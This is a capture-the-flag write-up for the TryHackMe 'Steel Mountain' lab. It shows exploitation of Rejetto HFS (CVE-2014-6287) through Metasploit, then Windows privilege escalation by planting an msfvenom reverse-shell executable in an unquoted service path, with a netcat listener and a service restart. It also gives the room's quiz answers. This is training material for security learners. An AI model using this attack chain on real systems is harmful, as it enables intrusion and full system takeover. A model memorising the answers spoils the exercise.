# TryHackMe : Steel Mountain

## [Task 1] Introduction

In the first task first deploy nmap and check open ports by running the command 

"nmap -sV -p- -vv -A --open 10.10.8.191".On the output of nmap in your terminal you will see that one of the open ports is port 80.


<img width="666" alt="1 1" src="https://user-images.githubusercontent.com/28839345/164236957-045e47a8-ed77-4973-bd63-3a051d8e802a.png">

Type on your browses search bar 

"http:10.10.8.191:80" and you will be redirected to a web page were the employee of the month is being shown.

<img width="913" alt="2" src="https://user-images.githubusercontent.com/28839345/164236959-1b61c5be-5b81-4809-9abd-2e4391bf7b82.png">

The right click on the page and view the page source.In the img html element you will see that the name of the png image is BillHarper.png as shown below.


<img width="649" alt="3" src="https://user-images.githubusercontent.com/28839345/164236973-2256fa56-c7cf-4d81-b150-888bda9f029e.png">

**Questions**
**1. Who is the employee of the month?**

Bill Harper

## [Task 2] Initial Access

In Task 2 you have to get initial shell access.

Since from your previous nmap results you know that there is a web server running on port 8080 go to http://10.10.8.191:8080 and view the page source.Then scroll down until you see the fieldset with id "serverinfo".You will see that there is a file server running "HTTPFileServer 2.3".


<img width="559" alt="4" src="https://user-images.githubusercontent.com/28839345/164236979-65d66e1c-55af-4edb-9522-464b2221112c.png">


If you google HTTPFileServer 2.3 you will see that the name of this file server is Rejetto HTTP File Server.

To find the exploit just google in your web browser "Rejetto HTTP File Server exploit" and you will find the cve number to exploit the web server.The CVE number is 2014-6287.

Since you know the CVE number of the exploit to find the exploit module in metasploit all you need to do after opening metasploit with the command msfconsole to search for this exploit by running the command "search cve:2014-6287".


<img width="716" alt="5" src="https://user-images.githubusercontent.com/28839345/164236985-01debf96-8e7f-4732-8033-aecbbcb7b937.png">

Run the command "use exploit/windows/http/rejetto_hfs_exec"


<img width="766" alt="6" src="https://user-images.githubusercontent.com/28839345/164236989-ecc8b2a6-b1f0-42ab-9639-fdca596da095.png">

Check the options you need to set to run the exploit by running the command "show options"

<img width="1050" alt="7" src="https://user-images.githubusercontent.com/28839345/164236990-cb409960-3991-4286-bd02-5b249003b71d.png">

RHOST is the remote host ip address.

RPORT is the web server port number.

LHOST is the local host ip address.

LPORT is the local port ip address.

Lastly type "exploit" to start the exploitation process and spawn the meterpreter shell.


<img width="982" alt="8" src="https://user-images.githubusercontent.com/28839345/164236996-e8a83162-3142-46c7-8e07-dae77fa6ea81.png">

Type "pwd" to check the directory you are in.

<img width="769" alt="9" src="https://user-images.githubusercontent.com/28839345/164236999-93d6e7cf-8637-4ddb-a15d-508b041b55f8.png">

The flag is located in the directory "C:\Users\bill\Desktop" in a file named "user.txt"

<img width="701" alt="10" src="https://user-images.githubusercontent.com/28839345/164237001-64b4630b-e26a-4b64-b9ff-ffd018b18eb0.png">

**Questions**

**Scan the machine with nmap. What is the other port running a web server on?**

8080

**Take a look at the other web server. What file server is running?**

Rejetto HTTP File Server

**What is the CVE number to exploit this file server?**

2014-6287

## [Task 3] Priviledge Escalation

In this task you will use Power up to escalate privviledges in Bills Windows machine.

PowerUp aims to be a clearinghouse of common Windows privilege escalation

vectors that rely on misconfigurations. To see more information search it on github and check the README.md file.


Step 1.

First you should download PowerUp.ps1 file from github.

Step 2.

Upload PowerUp.ps1 to the windows machine.To do this run the command "upload /root/home/PoweUp.ps1".In your case you may have to specify a different path depending on where in your local machine you have downloaded it the file.

<img width="878" alt="11" src="https://user-images.githubusercontent.com/28839345/164237004-32c989f8-c843-43ca-b07f-d3a43cb58334.png">



Step 3.

Type "load powershell" in your meterpreter.

Step 4.

Enter powershell by typing "powershell_shell".

Step 5.

Type . .\PowerUp.ps1

<img width="1050" alt="12" src="https://user-images.githubusercontent.com/28839345/164237008-5b4a8e40-1746-406c-aada-f1d5d5930b72.png">


What is the use of CanRestart option in PowerUp.ps1?

It is important this is True. We must have the ability to restart the service otherwise the changes can’t take place to escalate our privileges. If you have access to restart the machine that’s an option, but we generally want to avoid restarting machines if possible.

By typing Invoke-AllChecks you can see that the CanRestart option is set to true for the service AdvancedSystemCareService9

<img width="1021" alt="13" src="https://user-images.githubusercontent.com/28839345/164237010-687f2889-46ab-4d06-96c2-b86a938189e0.png">


To escalate priviledges first use msfvenom to generate a reverse shell as an Windows executable.

<img width="720" alt="14" src="https://user-images.githubusercontent.com/28839345/164237012-22e72d31-d22a-475f-a99a-a9cb4a3a134d.png">


Since you know that the service with the unquoted path vulnerability is in the following path "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe" go to "C:\Program Files (x86)\IObit" 

Then upload the Advanced.exe file in the /IObit directory.

Now all you need to do is restart the service AdvancedSystemCareService9 so the Advanced.exe can be executed.

Before restarting the service run nc in your localmachine by running the command 

"nc 10.10.136.236 4443".

<img width="549" alt="15" src="https://user-images.githubusercontent.com/28839345/164237015-9ae2177b-e3b5-4070-afb8-c792f7513e8e.png">


Type in your meterpreter shell "powershell_shell" and restart AdvancedSystemCareService9 by using the following two commands

1. net stop AdvancedSystemCareService9

2. net start AdvancedSystemCareService9

<img width="683" alt="16" src="https://user-images.githubusercontent.com/28839345/164237016-ffa9983a-a92c-49e3-b623-cdf673fe3137.png">


If you follow the previous steps correctly you will get NT AUTHORITY ACCESS to the windows machine from your local host machine

<img width="255" alt="17" src="https://user-images.githubusercontent.com/28839345/164237021-c2c66517-3deb-4f86-8716-6de83047893b.png">


The last step is to find the flag of the root which is located in the directory "C:\Users\Administrator\Desktop".


<img width="489" alt="18" src="https://user-images.githubusercontent.com/28839345/164237022-7ad4c92e-bf8c-455c-8f18-37eb1bd96bc1.png">

<img width="456" alt="19" src="https://user-images.githubusercontent.com/28839345/164237024-87068b0c-7f60-459c-a587-ed6ea4b2eb5a.png">
**Questions**

**1. Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?**

AdvancedSystemCareService9

